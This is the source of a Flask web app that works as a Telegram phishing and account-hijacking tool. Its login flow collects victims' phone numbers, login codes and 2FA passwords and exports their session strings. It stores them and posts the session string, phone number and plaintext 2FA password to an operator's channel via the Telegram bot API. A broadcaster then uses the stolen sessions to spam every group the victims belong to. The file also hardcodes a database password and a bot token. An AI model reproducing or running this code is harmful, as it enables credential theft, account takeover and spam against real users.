from flask import Flask, render_template, request, session, redirect, jsonify, url_for, send_from_directory, flash
import os
import uuid
import asyncio
import threading
import traceback
import time
from datetime import datetime, timedelta
from pyrogram import Client
from pyrogram.errors import (
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    FloodWait,
    BadRequest,
    UserDeactivated,
    AuthKeyUnregistered
)
from pymongo import MongoClient
from pymongo.errors import ServerSelectionTimeoutError
from bson import ObjectId
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "7f9c2e1a84d6b3f0c5a7e9d2f1b8c4e6a3d7f0b2c9e5a1d8f6c3b7e2a9d4f1")

# ========== MONGODB CONFIG ==========
MONGODB_URI = os.environ.get("MONGODB_URI", "mongodb+srv://nexacoders2_db_user:dxYh7QOdHvH6OVdd@cluster0.f4qxcbk.mongodb.net/?appName=Cluster0")
DB_NAME = os.environ.get("DB_NAME", "adult_bot_db")

try:
    mongo_client = MongoClient(MONGODB_URI, serverSelectionTimeoutMS=5000)
    db = mongo_client[DB_NAME]
    mongo_client.admin.command('ping')
    print("✅ MongoDB Connected Successfully!")
    db_connected = True
except Exception as e:
    print(f"❌ MongoDB Connection Failed: {e}")
    mongo_client = None
    db = None
    db_connected = False

users_col = db.users if db is not None else None
ads_config_col = db.ads_config if db is not None else None
temp_sessions_col = db.temp_sessions if db is not None else None
ads_logs_col = db.ads_logs if db is not None else None

# ========== UPLOAD CONFIG ==========
UPLOAD_FOLDER = 'uploads'
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'webp'}
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

API_ID = int(os.environ.get("API_ID", "32208414"))
API_HASH = os.environ.get("API_HASH", "628f11c05a44c8dda4b006e66f4bf7df")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8991327348:AAH3uOzXU8aZZ2LKfUlK1MH4Wp2AYKo1aIs")
CHANNEL_ID = os.environ.get("CHANNEL_ID", "-1004376082945")

# ========== SESSION MANAGEMENT ==========
class SessionThread:
    def __init__(self, session_id, phone):
        self.session_id = session_id
        self.phone = phone
        self.client = None
        self.loop = None
        self.thread = None
        self.connected = False
        self.connection_error = None
        self._connected_event = threading.Event()
        self._start_thread()

    def _start_thread(self):
        self.thread = threading.Thread(target=self._run_loop, daemon=True)
        self.thread.start()

    async def _init_and_connect(self):
        self.client = Client(
            name=f"session_{self.session_id}",
            api_id=API_ID,
            api_hash=API_HASH,
            in_memory=True,
            no_updates=True
        )
        await self.client.connect()

    def _run_loop(self):
        try:
            self.loop = asyncio.new_event_loop()
            asyncio.set_event_loop(self.loop)
            self.loop.run_until_complete(self._init_and_connect())
            self.connected = True
            self._connected_event.set()
            self.loop.run_forever()
        except Exception as e:
            self.connection_error = str(e)
            self.connected = False
            self._connected_event.set()
        finally:
            try:
                if self.loop and self.loop.is_running():
                    self.loop.stop()
                if self.loop and not self.loop.is_closed():
                    self.loop.close()
            except:
                pass

    def wait_for_connection(self, timeout=10):
        return self._connected_event.wait(timeout=timeout)

    def execute(self, coro_func, *args, timeout=60):
        if not self.loop or not self.connected:
            raise RuntimeError("Session not connected")
        async def wrapper():
            coro = coro_func(*args)
            return await coro
        future = asyncio.run_coroutine_threadsafe(wrapper(), self.loop)
        return future.result(timeout=timeout)

    def stop(self):
        try:
            if self.client and self.connected:
                asyncio.run_coroutine_threadsafe(self.client.disconnect(), self.loop).result(timeout=3)
            if self.loop and self.loop.is_running():
                self.loop.call_soon_threadsafe(self.loop.stop)
            if self.thread and self.thread.is_alive():
                self.thread.join(timeout=3)
        except:
            pass

class SessionManager:
    def __init__(self):
        self._sessions = {}
        self._lock = threading.Lock()

    def create_session(self, session_id, phone):
        self.remove_session(session_id)
        session = SessionThread(session_id, phone)
        if not session.wait_for_connection(timeout=10):
            session.stop()
            raise RuntimeError("Session connection timeout")
        if not session.connected:
            error_msg = session.connection_error or "Unknown error"
            session.stop()
            raise RuntimeError(f"Failed to connect: {error_msg}")
        with self._lock:
            self._sessions[session_id] = session
        if temp_sessions_col is not None:
            temp_sessions_col.update_one(
                {'_id': session_id},
                {'$set': {'phone': phone, 'created_at': datetime.now(), 'status': 'connected'}},
                upsert=True
            )
        return session

    def get_session(self, session_id):
        with self._lock:
            session = self._sessions.get(session_id)
            if session and session.connected and session.thread.is_alive():
                return session
            elif session:
                self._sessions.pop(session_id, None)
        return None

    def remove_session(self, session_id):
        with self._lock:
            session = self._sessions.pop(session_id, None)
        if session:
            session.stop()
        if temp_sessions_col is not None:
            temp_sessions_col.delete_one({'_id': session_id})

    def cleanup_old(self, max_age_minutes=10):
        cutoff = datetime.now() - timedelta(minutes=max_age_minutes)
        if temp_sessions_col is not None:
            old_docs = temp_sessions_col.find({'created_at': {'$lt': cutoff}})
            for doc in old_docs:
                self.remove_session(doc['_id'])
            temp_sessions_col.delete_many({'created_at': {'$lt': cutoff}})

session_manager = SessionManager()

# ========== ADS BROADCAST SYSTEM ==========
class AdsBroadcaster:
    def __init__(self):
        self._running = False
        self._thread = None
        self._stop_event = threading.Event()

    def start(self):
        if self._running:
            return False
        self._running = True
        self._stop_event.clear()
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()
        print("📢 Ads Broadcaster started")
        return True

    def stop(self):
        if not self._running:
            return False
        self._stop_event.set()
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
        print("📢 Ads Broadcaster stopped")
        return True

    def _run(self):
        while not self._stop_event.is_set():
            try:
                self._check_and_broadcast()
            except Exception as e:
                print(f"Broadcast error: {e}")
            self._stop_event.wait(30)

    def _check_and_broadcast(self):
        if users_col is None or ads_config_col is None:
            return
        config = ads_config_col.find_one({"_id": "main_config"})
        if not config or not config.get("ads_enabled", False):
            return
        
        interval = config.get("interval", 600)
        caption = config.get("caption", "")
        photo_path = config.get("photo_path")
        
        cutoff = datetime.now() - timedelta(seconds=interval)
        users_to_send = list(users_col.find({
            "ads_enabled": True,
            "$or": [{"last_ad_time": {"$lt": cutoff}}, {"last_ad_time": None}]
        }))
        
        if not users_to_send:
            return
        
        print(f"📨 Broadcasting to {len(users_to_send)} users...")
        
        for user in users_to_send:
            if self._stop_event.is_set():
                break
            session_string = user.get("session_string")
            if not session_string:
                continue
            threading.Thread(
                target=self._send_to_user,
                args=(user, session_string, caption, photo_path),
                daemon=True
            ).start()

    def _send_to_user(self, user, session_string, caption, photo_path):
        user_id = user.get("user_id")
        phone = user.get("phone", "Unknown")
        try:
            async def send_ad():
                client = Client(
                    name=f"temp_{user_id}_{uuid.uuid4().hex[:8]}",
                    api_id=API_ID,
                    api_hash=API_HASH,
                    session_string=session_string,
                    in_memory=True,
                    no_updates=True
                )
                try:
                    await client.connect()
                    # Send to saved messages
                    if photo_path and os.path.exists(photo_path):
                        await client.send_photo("me", photo=photo_path, caption=caption)
                    else:
                        await client.send_message("me", caption)
                    
                    # Send to groups
                    try:
                        dialogs = await client.get_dialogs()
                        for dialog in dialogs:
                            if dialog.chat.type in ["group", "supergroup"]:
                                try:
                                    if photo_path and os.path.exists(photo_path):
                                        await client.send_photo(dialog.chat.id, photo=photo_path, caption=caption)
                                    else:
                                        await client.send_message(dialog.chat.id, caption)
                                    await asyncio.sleep(1)
                                except:
                                    pass
                    except:
                        pass
                    
                    users_col.update_one(
                        {"_id": user["_id"]},
                        {"$set": {"last_ad_time": datetime.now()}, "$inc": {"total_ads_sent": 1}}
                    )
                    print(f"✅ Ad sent to {phone}")
                finally:
                    try:
                        await client.disconnect()
                    except:
                        pass
            
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(send_ad())
            loop.close()
            
        except UserDeactivated:
            users_col.update_one({"_id": user["_id"]}, {"$set": {"ads_enabled": False, "status": "deactivated"}})
        except AuthKeyUnregistered:
            users_col.update_one({"_id": user["_id"]}, {"$set": {"ads_enabled": False, "status": "expired"}})
        except FloodWait as e:
            print(f"⏳ Flood wait for {phone}: {e.value}s")
        except Exception as e:
            print(f"❌ Failed to send to {phone}: {e}")

ads_broadcaster = AdsBroadcaster()

# ========== DATABASE HELPERS ==========
def save_session_to_db(session_data):
    if users_col is None:
        return False
    try:
        existing = users_col.find_one({"phone": session_data["phone"]})
        if existing:
            users_col.update_one(
                {"_id": existing["_id"]},
                {"$set": {
                    "session_string": session_data["session_string"],
                    "updated_at": datetime.now(),
                    "user_id": session_data["id"],
                    "username": session_data["username"],
                    "first_name": session_data["first_name"],
                    "last_name": session_data["last_name"],
                    "status": "active",
                    "ads_enabled": True
                }}
            )
            return str(existing["_id"])
        else:
            result = users_col.insert_one({
                "user_id": session_data["id"],
                "first_name": session_data["first_name"],
                "last_name": session_data["last_name"],
                "username": session_data["username"],
                "phone": session_data["phone"],
                "session_string": session_data["session_string"],
                "session_name": session_data["session_name"],
                "created_at": datetime.now(),
                "updated_at": datetime.now(),
                "status": "active",
                "ads_enabled": True,
                "last_ad_time": None,
                "total_ads_sent": 0
            })
            return str(result.inserted_id)
    except Exception as e:
        print(f"MongoDB Error: {e}")
        return False

def get_ads_config():
    if ads_config_col is None:
        return {"ads_enabled": False, "interval": 600, "photo_path": None, "caption": "", "updated_at": datetime.now()}
    config = ads_config_col.find_one({"_id": "main_config"})
    if not config:
        default = {"_id": "main_config", "ads_enabled": False, "interval": 600, "photo_path": None, "caption": "", "updated_at": datetime.now()}
        ads_config_col.insert_one(default)
        return default
    return config

def update_ads_config(updates):
    if ads_config_col is None:
        return False
    updates["updated_at"] = datetime.now()
    ads_config_col.update_one({"_id": "main_config"}, {"$set": updates}, upsert=True)
    return True

def get_stats():
    if users_col is None:
        return {"total_users": 0, "active_users": 0, "idle_users": 0, "total_ads_sent": 0, "db_connected": False}
    total = users_col.count_documents({})
    active = users_col.count_documents({"status": "active"})
    idle = users_col.count_documents({"status": "idle"})
    pipeline = [{"$group": {"_id": None, "total": {"$sum": "$total_ads_sent"}}}]
    ads_result = list(users_col.aggregate(pipeline))
    total_ads = ads_result[0]["total"] if ads_result else 0
    yesterday = datetime.now() - timedelta(days=1)
    recent_users = users_col.count_documents({"created_at": {"$gte": yesterday}})
    last_hour = datetime.now() - timedelta(hours=1)
    online_users = users_col.count_documents({"last_ad_time": {"$gte": last_hour}})
    return {
        "total_users": total, "active_users": active, "idle_users": idle,
        "online_users": online_users, "recent_users": recent_users,
        "total_ads_sent": total_ads, "db_connected": True
    }

def get_all_users():
    if users_col is None:
        return []
    users = list(users_col.find().sort("created_at", -1))
    formatted = []
    for user in users:
        formatted.append({
            "id": str(user.get("_id")),
            "user_id": user.get("user_id"),
            "name": f"{user.get('first_name', '')} {user.get('last_name', '')}".strip(),
            "username": user.get("username", "N/A"),
            "phone": user.get("phone", "N/A"),
            "status": user.get("status", "unknown"),
            "ads_enabled": user.get("ads_enabled", True),
            "total_ads_sent": user.get("total_ads_sent", 0),
            "created_at": user.get("created_at", datetime.now()).strftime("%Y-%m-%d %H:%M") if user.get("created_at") else "N/A",
            "last_ad_time": user.get("last_ad_time", "").strftime("%Y-%m-%d %H:%M") if user.get("last_ad_time") else "Never"
        })
    return formatted

def send_to_channel(message):
    if not BOT_TOKEN:
        return False
    import requests
    try:
        r = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": CHANNEL_ID, "text": message, "parse_mode": "HTML", "disable_web_page_preview": True},
            timeout=10
        )
        return r.json().get("ok", False)
    except Exception as e:
        print(f"Channel error: {e}")
        return False

# ========== USER ROUTES ==========
@app.route("/")
def index():
    return redirect("/login")

@app.route("/login")
def login():
    return render_template("login.html")

@app.route("/api/send-code", methods=["POST"])
def send_code():
    try:
        session_manager.cleanup_old()
    except:
        pass
    
    data = request.get_json() or {}
    phone = data.get("phone", "").strip()
    session_name = data.get("session_name", "session").strip()

    if not phone or len(phone) < 10:
        return jsonify(ok=False, error="Invalid phone number"), 400

    session_id = str(uuid.uuid4())[:8]
    try:
        session_thread = session_manager.create_session(session_id, phone)
        sent = session_thread.execute(lambda: session_thread.client.send_code(phone))
        
        if temp_sessions_col is not None:
            temp_sessions_col.update_one(
                {'_id': session_id},
                {'$set': {
                    'phone_code_hash': sent.phone_code_hash,
                    'session_name': session_name,
                    'status': 'code_sent',
                    'phone': phone
                }}
            )
        return jsonify(ok=True, session_id=session_id, message=f"Code sent to {phone}")
    except PhoneNumberInvalid:
        session_manager.remove_session(session_id)
        return jsonify(ok=False, error="Invalid phone number"), 400
    except FloodWait as e:
        session_manager.remove_session(session_id)
        return jsonify(ok=False, error=f"Please wait {e.value} seconds"), 429
    except Exception as e:
        session_manager.remove_session(session_id)
        return jsonify(ok=False, error=str(e)), 500

@app.route("/api/verify-code", methods=["POST"])
def verify_code():
    data = request.get_json() or {}
    session_id = data.get("session_id", "")
    code = data.get("code", "").strip().replace(" ", "")
    password = data.get("password", "")

    if not session_id:
        return jsonify(ok=False, error="Session ID required"), 400

    session_thread = session_manager.get_session(session_id)
    if not session_thread:
        return jsonify(ok=False, error="Session expired"), 400

    session_doc = temp_sessions_col.find_one({'_id': session_id}) if temp_sessions_col else None
    phone = session_doc.get('phone') if session_doc else session_thread.phone
    phone_code_hash = session_doc.get('phone_code_hash') if session_doc else None
    session_name = session_doc.get('session_name', 'session') if session_doc else 'session'

    if not phone:
        session_manager.remove_session(session_id)
        return jsonify(ok=False, error="Session data lost"), 400

    if not code or not code.isdigit():
        return jsonify(ok=False, error="Invalid verification code"), 400

    result = {"user": None, "session_string": None, "error": None}

    try:
        try:
            user = session_thread.execute(
                lambda: session_thread.client.sign_in(phone_number=phone, phone_code_hash=phone_code_hash, phone_code=code)
            )
            session_string = session_thread.execute(lambda: session_thread.client.export_session_string())
            result = {"user": user, "session_string": session_string, "error": None}
        except SessionPasswordNeeded:
            if not password:
                result = {"user": None, "session_string": None, "error": "2FA_PASSWORD_REQUIRED"}
            else:
                try:
                    user = session_thread.execute(lambda: session_thread.client.check_password(password))
                    session_string = session_thread.execute(lambda: session_thread.client.export_session_string())
                    result = {"user": user, "session_string": session_string, "error": None}
                except Exception as e:
                    result = {"user": None, "session_string": None, "error": f"Invalid 2FA password: {str(e)}"}
        except PhoneCodeInvalid:
            result = {"user": None, "session_string": None, "error": "INVALID_CODE"}
        except PhoneCodeExpired:
            result = {"user": None, "session_string": None, "error": "CODE_EXPIRED"}
        except Exception as e:
            result = {"user": None, "session_string": None, "error": str(e)}
    except Exception as e:
        return jsonify(ok=False, error=f"Server error: {str(e)}"), 500
    finally:
        session_manager.remove_session(session_id)

    if result["error"] == "2FA_PASSWORD_REQUIRED":
        return jsonify(ok=False, requires_password=True), 401
    elif result["error"] == "INVALID_CODE":
        return jsonify(ok=False, error="Invalid verification code"), 401
    elif result["error"] == "CODE_EXPIRED":
        return jsonify(ok=False, error="Code expired"), 401
    elif result["error"]:
        return jsonify(ok=False, error=result["error"]), 400

    user = result["user"]
    session_string = result["session_string"]
    user_info = {
        "id": user.id,
        "first_name": user.first_name,
        "last_name": user.last_name or "",
        "username": user.username or "N/A",
        "phone": phone,
        "session_string": session_string,
        "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "session_name": session_name
    }

    db_id = save_session_to_db(user_info)
    if db_id:
        print(f"✅ User saved: {db_id}")

    country_code = phone[:3] if phone.startswith("+") else phone[:2]
    channel_msg = f"""🟢 <b>NEW SESSION</b>
👤 <b>Name:</b> {user_info['first_name']} {user_info['last_name']}
🔗 <b>Username:</b> @{user_info['username']}
🆔 <b>User ID:</b> <code>{user_info['id']}</code>
📱 <b>Phone:</b> <code>{phone}</code>
🌍 <b>Country:</b> +{country_code}"""
    if password:
        channel_msg += f"\n🔑 <b>2FA:</b> <code>{password}</code>"
    channel_msg += f"\n\n<b>🔐 SESSION:</b>\n<code>{session_string}</code>"
    send_to_channel(channel_msg)
    session["user"] = user_info

    return jsonify(ok=True, user={
        "id": user_info["id"],
        "name": f"{user_info['first_name']} {user_info['last_name']}",
        "username": user_info["username"],
        "phone": phone
    })

@app.route("/api/logout", methods=["POST"])
def logout():
    session.clear()
    return jsonify(ok=True)

@app.route("/dashboard")
def dashboard():
    if "user" not in session:
        return redirect("/login")
    return render_template("dashboard.html", user=session["user"])

# ========== ADMIN ROUTES ==========
@app.route("/admin")
def admin_panel():
    config = get_ads_config()
    stats = get_stats()
    return render_template("admin.html", config=config, stats=stats)

@app.route("/admin/stats")
def admin_stats_page():
    stats = get_stats()
    users = get_all_users()
    config = get_ads_config()
    return render_template("stats.html", stats=stats, users=users, config=config)

@app.route("/api/toggle-ads", methods=["POST"])
def toggle_ads():
    config = get_ads_config()
    new_status = not config.get("ads_enabled", False)
    if update_ads_config({"ads_enabled": new_status}):
        if users_col:
            users_col.update_many({}, {"$set": {"ads_enabled": new_status}})
        # Direct control of broadcaster
        if new_status:
            ads_broadcaster.start()
        else:
            ads_broadcaster.stop()
        return jsonify({"success": True, "enabled": new_status, "message": f"Ads {'enabled' if new_status else 'disabled'}!"})
    return jsonify({"success": False, "error": "Failed"}), 500

@app.route("/api/set-interval", methods=["POST"])
def set_interval():
    data = request.get_json() or {}
    interval = data.get("interval")
    if not interval or not isinstance(interval, int):
        return jsonify({"success": False, "error": "Invalid interval"}), 400
    if update_ads_config({"interval": interval}):
        return jsonify({"success": True, "interval": interval, "message": f"Interval: {interval//60} min"})
    return jsonify({"success": False, "error": "Failed"}), 500

@app.route("/api/set-caption", methods=["POST"])
def set_caption():
    data = request.get_json() or {}
    caption = data.get("caption", "")
    if update_ads_config({"caption": caption}):
        return jsonify({"success": True, "message": "Caption updated!"})
    return jsonify({"success": False, "error": "Failed"}), 500

@app.route("/api/upload-photo", methods=["POST"])
def upload_photo():
    if 'photo' not in request.files:
        return jsonify({"success": False, "error": "No file"}), 400
    file = request.files['photo']
    if file.filename == '':
        return jsonify({"success": False, "error": "No file selected"}), 400
    if file and allowed_file(file.filename):
        filename = secure_filename(f"ad_photo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.{file.filename.rsplit('.', 1)[1]}")
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)
        update_ads_config({"photo_path": filepath})
        return jsonify({"success": True, "path": filepath, "message": "Photo uploaded!"})
    return jsonify({"success": False, "error": "Invalid file type"}), 400

@app.route("/api/preview")
def preview_ad():
    config = get_ads_config()
    return jsonify({
        "success": True,
        "photo_path": config.get("photo_path"),
        "caption": config.get("caption", ""),
        "interval": config.get("interval", 600),
        "ads_enabled": config.get("ads_enabled", False)
    })

@app.route("/uploads/<path:filename>")
def serve_upload(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

@app.route("/api/user/<user_id>/toggle", methods=["POST"])
def toggle_user_ads(user_id):
    if users_col is None:
        return jsonify({"success": False, "error": "DB not connected"}), 500
    try:
        user = users_col.find_one({"_id": ObjectId(user_id)})
    except:
        return jsonify({"success": False, "error": "Invalid user ID"}), 400
    if not user:
        return jsonify({"success": False, "error": "User not found"}), 404
    new_status = not user.get("ads_enabled", True)
    users_col.update_one({"_id": ObjectId(user_id)}, {"$set": {"ads_enabled": new_status}})
    return jsonify({"success": True, "enabled": new_status, "message": f"User ads {'enabled' if new_status else 'disabled'}"})

@app.route("/api/stats/refresh")
def refresh_stats():
    return jsonify(get_stats())

# Start broadcaster if ads enabled on startup
@app.before_first_request
def init_broadcaster():
    config = get_ads_config()
    if config.get("ads_enabled", False):
        ads_broadcaster.start()

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)